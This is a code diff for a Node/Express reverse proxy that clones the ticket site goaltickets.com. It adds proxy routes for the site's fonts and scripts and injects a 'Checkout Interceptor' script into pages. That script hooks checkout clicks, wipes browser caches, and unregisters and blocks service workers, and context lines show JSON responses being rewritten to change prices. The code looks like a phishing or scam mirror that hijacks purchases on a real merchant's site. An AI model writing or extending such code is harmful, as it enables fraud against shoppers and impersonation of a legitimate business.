@@ -5,6 +5,7 @@ const helmet = require('helmet');
 
 const app = express();
 const PORT = process.env.PORT || 8080;
+const VERSION = '2.0.0'; // Версия для принудительного обновления
 
 // Оптимизация памяти для Railway
 if (process.env.NODE_ENV === 'production') {
@@ -170,16 +171,42 @@ app.get('*checkout*', (req, res) => {
       next();
     });
 
-    // Проксируем все шрифты
-    app.get('/cdn/fonts/*', (req, res, next) => {
-      console.log('🔤 Fonts intercepted:', req.url);
-      next();
-    });
+// Специальный маршрут для шрифтов с CORS
+app.get('/cdn/fonts/*', (req, res, next) => {
+  console.log('🔤 Fonts intercepted:', req.url);
+  const fontProxy = createProxyMiddleware({
+    target: 'https://goaltickets.com',
+    changeOrigin: true,
+    secure: true,
+    onProxyRes: (proxyRes, req, res) => {
+      // Устанавливаем правильные заголовки для шрифтов
+      proxyRes.headers['Access-Control-Allow-Origin'] = '*';
+      proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
+      proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
+      proxyRes.headers['Content-Type'] = 'font/woff2';
+      proxyRes.headers['Cache-Control'] = 'public, max-age=31536000'; // 1 год кэш
+    }
+  });
+  fontProxy(req, res);
+});
 
-    // Проксируем все скрипты
+    // Специальный маршрут для скриптов с правильными MIME типами
     app.get('/cdn/shop/t/*', (req, res, next) => {
       console.log('📜 Shop scripts intercepted:', req.url);
-      next();
+      const scriptProxy = createProxyMiddleware({
+        target: 'https://goaltickets.com',
+        changeOrigin: true,
+        secure: true,
+        onProxyRes: (proxyRes, req, res) => {
+          // Устанавливаем правильные заголовки для скриптов
+          proxyRes.headers['Access-Control-Allow-Origin'] = '*';
+          proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
+          proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
+          proxyRes.headers['Content-Type'] = 'application/javascript; charset=utf-8';
+          proxyRes.headers['Cache-Control'] = 'public, max-age=31536000'; // 1 год кэш
+        }
+      });
+      scriptProxy(req, res);
     });
 
     // Проксируем все внешние домены
@@ -309,7 +336,9 @@ const proxyOptions = {
         
         // Добавляем кэширование
         if (proxyRes.headers['content-type'] && proxyRes.headers['content-type'].includes('text/html')) {
-          proxyRes.headers['Cache-Control'] = 'public, max-age=300'; // 5 минут кэш
+          proxyRes.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'; // Отключаем кэш для HTML
+          proxyRes.headers['Pragma'] = 'no-cache';
+          proxyRes.headers['Expires'] = '0';
         }
         
         // Добавляем CORS для всех ресурсов
@@ -318,21 +347,28 @@ const proxyOptions = {
         proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
         proxyRes.headers['Access-Control-Allow-Credentials'] = 'true';
         proxyRes.headers['Access-Control-Expose-Headers'] = 'Content-Length, Content-Type, Date, Server, Transfer-Encoding';
+        proxyRes.headers['X-Proxy-Version'] = VERSION; // Версия прокси
         
         // Исправляем MIME типы для скриптов
         if (req.url.includes('.js')) {
           proxyRes.headers['Content-Type'] = 'application/javascript; charset=utf-8';
+          proxyRes.headers['Access-Control-Allow-Origin'] = '*';
+          proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
+          proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
         }
         
         // Исправляем MIME типы для CSS
         if (req.url.includes('.css')) {
           proxyRes.headers['Content-Type'] = 'text/css; charset=utf-8';
+          proxyRes.headers['Access-Control-Allow-Origin'] = '*';
         }
         
         // Исправляем MIME типы для шрифтов
         if (req.url.includes('.woff') || req.url.includes('.woff2') || req.url.includes('.ttf') || req.url.includes('.eot')) {
           proxyRes.headers['Content-Type'] = 'font/woff2';
           proxyRes.headers['Access-Control-Allow-Origin'] = '*';
+          proxyRes.headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
+          proxyRes.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin, User-Agent, Cache-Control, Pragma';
         }
         
         // Перехватываем JSON ответы для изменения цен
@@ -498,9 +534,19 @@ const proxyOptions = {
             // Добавляем скрипт перехвата перед закрывающим тегом </body>
             const checkoutScript = `
               <script>
-                // 🎯 CHECKOUT INTERCEPTOR
+                // 🎯 CHECKOUT INTERCEPTOR v${VERSION}
                 (function() {
-                  console.log('🎯 Checkout Interceptor loaded');
+                  console.log('🎯 Checkout Interceptor v${VERSION} loaded');
+                  
+                  // Принудительное обновление кэша
+                  if ('caches' in window) {
+                    caches.keys().then(function(names) {
+                      for (let name of names) {
+                        caches.delete(name);
+                        console.log('🗑️ Cache cleared:', name);
+                      }
+                    });
+                  }
                   
                   function interceptCheckoutClicks() {
                     document.addEventListener('click', function(event) {
@@ -666,13 +712,24 @@ const proxyOptions = {
                   
                   // 🎯 ИСПРАВЛЕНИЕ SERVICE WORKER
                   function fixServiceWorker() {
+                    console.log('🔧 Fixing Service Worker...');
                     // Отключаем Service Worker
                     if ('serviceWorker' in navigator) {
                       navigator.serviceWorker.getRegistrations().then(function(registrations) {
+                        console.log('🔧 Found', registrations.length, 'service workers');
                         for(let registration of registrations) {
-                          registration.unregister();
+                          console.log('🔧 Unregistering service worker:', registration.scope);
+                          registration.unregister().then(function(boolean) {
+                            console.log('🔧 Service worker unregistered:', boolean);
+                          });
                         }
                       });
+                      
+                      // Также отключаем все возможные Service Worker
+                      navigator.serviceWorker.register = function() {
+                        console.log('🔧 Service Worker registration blocked');
+                        return Promise.reject(new Error('Service Worker registration blocked'));
+                      };
                     }
                   }
                   
